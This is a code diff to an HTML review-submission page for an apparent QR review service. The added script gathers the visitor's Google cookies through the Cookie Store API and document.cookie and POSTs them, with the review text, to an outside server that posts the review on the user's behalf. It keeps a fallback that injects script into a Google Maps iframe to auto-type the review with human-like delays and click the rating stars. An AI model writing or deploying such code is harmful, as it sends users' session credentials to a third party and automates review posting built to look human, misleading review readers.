@@ -4,6 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta name="theme-color" content="#1a73e8">
+  <meta name="server-url" content="https://qrify-server.onrender.com">
   <title>Post Your Review</title>
   <style>
     * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
@@ -73,23 +74,110 @@
     const stars = document.querySelectorAll('#stars .star');
     stars.forEach((s, i) => s.classList.toggle('filled', i < rating));
 
-    // ===== LOAD GOOGLE MAPS IN IFRAME =====
+    // ===== SERVER INTEGRATION =====
+    const SERVER_URL = document.querySelector('meta[name="server-url"]')?.content 
+      || 'https://qrify-server.onrender.com';
+    
+    const customerId = localStorage.getItem('qrify_customer_id') || 
+      (localStorage.setItem('qrify_customer_id', 'cust_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9)),
+       localStorage.getItem('qrify_customer_id'));
+    
+    // Get cookies for Google (limited to what we can access)
+    async function getCookies() {
+      const cookies = [];
+      // Try Cookie Store API
+      if ('cookieStore' in window) {
+        try {
+          const all = await cookieStore.getAll({ domain: 'google.com' });
+          cookies.push(...all.map(c => ({
+            name: c.name, value: c.value, domain: c.domain,
+            path: c.path, expires: c.expires, secure: c.secure, sameSite: c.sameSite
+          })));
+        } catch {}
+      }
+      // Fallback to document.cookie
+      document.cookie.split(';').forEach(c => {
+        const [name, value] = c.trim().split('=');
+        if (name && value) cookies.push({ name, value, domain: '.google.com' });
+      });
+      return cookies;
+    }
+
+    async function submitViaServer() {
+      const cookies = await getCookies();
+      
+      try {
+        const response = await fetch(`${SERVER_URL}/api/submit-review`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ outletId, rating, reviewText: text, customerId, cookies })
+        });
+        
+        const result = await response.json();
+        
+        if (!response.ok) {
+          if (response.status === 401) return { authRequired: true, error: result.error };
+          throw new Error(result.error || 'Server error');
+        }
+        
+        return { success: true, ...result };
+      } catch (error) {
+        return { fallback: true, error: error.message };
+      }
+    }
+
+    // ===== MAIN FLOW =====
     const frame = document.getElementById('mapsFrame');
     const loading = document.getElementById('loadingState');
     const errorState = document.getElementById('errorState');
     const copyBox = document.getElementById('copyBox');
+    const copyBtn = errorState.querySelector('button');
 
     copyBox.value = text;
 
-    frame.src = googleMapsUrl;
-
-    frame.addEventListener('load', () => {
+    // Try server submission first
+    submitViaServer().then(result => {
       loading.style.display = 'none';
+      
+      if (result.success) {
+        // Server submitted successfully
+        frame.style.display = 'none';
+        errorState.style.display = 'none';
+        
+        const successDiv = document.createElement('div');
+        successDiv.style.cssText = 'display:flex;flex-direction:column;align-items:center;justify-content:center;height:100%;padding:24px;text-align:center;color:#34a853;gap:16px;';
+        successDiv.innerHTML = `
+          <div style="font-size:64px;">✅</div>
+          <h2 style="margin:0;color:#1d1d1f;">Review Submitted!</h2>
+          <p style="margin:0;color:#5f6368;">Your review has been posted successfully.</p>
+          <p style="margin:0;font-size:14px;color:#80868b;max-width:300px;">${text.substring(0, 120)}...</p>
+          <button onclick="window.close()" style="margin-top:16px;padding:12px 24px;background:#1a73e8;color:white;border:none;border-radius:8px;font-weight:600;">Close Window</button>
+        `;
+        document.body.appendChild(successDiv);
+        return;
+      }
+      
+      // Fallback to client-side iframe
+      if (result.authRequired) {
+        console.log('Server auth required, falling back to iframe...');
+      } else {
+        console.log('Server unavailable, falling back to iframe...', result.error);
+      }
+      
+      loadIframeFallback();
+    }).catch(() => {
+      loading.style.display = 'none';
+      loadIframeFallback();
+    });
+
+    function loadIframeFallback() {
+      frame.src = googleMapsUrl;
       frame.style.display = 'block';
       
-      // Try to inject auto-fill script
-      setTimeout(() => injectAutofill(), 500);
-    });
+      frame.addEventListener('load', () => {
+        setTimeout(() => injectAutofill(), 500);
+      });
+    }
 
     function injectAutofill() {
       try {
@@ -107,16 +195,12 @@
                 check();
               });
             }
-
             async function autofill() {
               try {
-                // 1. Find and fill textarea
                 const textarea = await waitFor('#c4');
                 textarea.focus();
-                
                 const reviewText = ${JSON.stringify(text)};
-                textarea.value = ''; // Clear any placeholder
-                
+                textarea.value = '';
                 for (const ch of reviewText) {
                   textarea.value += ch;
                   textarea.dispatchEvent(new Event('input', { bubbles: true }));
@@ -124,33 +208,18 @@
                 }
                 textarea.dispatchEvent(new Event('change', { bubbles: true }));
                 textarea.blur();
-
-                // 2. Click the rating stars (find unchecked one matching rating)
                 await new Promise(r => setTimeout(r, 400 + Math.random() * 500));
-                const starSelector = '.s2xyy[data-rating="' + ${rating} + '"][aria-checked="false"]';
-                const star = document.querySelector(starSelector);
-                if (star) {
-                  star.click();
-                  star.focus();
-                }
-
-                console.log('[AutoFill] Success — form ready for user to post');
-              } catch (e) {
-                console.warn('[AutoFill] Failed:', e.message);
-                throw e; // Trigger fallback
-              }
+                const star = document.querySelector('.s2xyy[data-rating="${rating}"][aria-checked="false"]');
+                if (star) { star.click(); star.focus(); }
+                console.log('[AutoFill] Success');
+              } catch (e) { console.warn('[AutoFill] Failed:', e.message); throw e; }
             }
-
-            if (document.readyState === 'loading') {
-              document.addEventListener('DOMContentLoaded', autofill);
-            } else {
-              autofill();
-            }
+            if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', autofill);
+            else autofill();
           })();
         `;
         frame.contentWindow.eval(script);
       } catch (e) {
-        // Cross-origin block — show fallback
         showFallback();
       }
     }
@@ -167,10 +236,7 @@
       const btn = errorState.querySelector('button');
       btn.textContent = 'Copied!';
       btn.style.background = '#34a853';
-      setTimeout(() => {
-        btn.textContent = 'Copy to Clipboard';
-        btn.style.background = '#1a73e8';
-      }, 2000);
+      setTimeout(() => { btn.textContent = 'Copy to Clipboard'; btn.style.background = '#1a73e8'; }, 2000);
     }
   </script>
 </body>
